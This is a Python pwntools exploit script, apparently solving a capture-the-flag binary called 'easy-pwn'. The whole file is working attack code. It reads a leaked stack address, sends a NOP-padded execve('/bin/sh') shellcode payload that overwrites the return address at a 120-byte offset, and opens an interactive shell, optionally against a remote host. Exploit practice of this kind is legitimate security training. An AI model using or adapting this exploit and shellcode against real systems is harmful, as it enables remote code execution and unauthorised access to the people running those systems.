from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
init-pwndbg
b *admin_login+139
continue
""".format(**locals())

exe = "./easy-pwn"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
context.terminal = "kitty"

io = start()
offset = 120

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

io.sendlineafter(b">> ", b"1")

leak = int(io.recvuntil(b"x")[:-1])

log.info(f"Buffer leak : {hex(leak)}")

payload = b"\x90" * len(shellcode)
payload += shellcode
payload = payload.ljust(offset, b"\x90")
payload += p64(leak)

io.sendline(payload)

io.interactive()
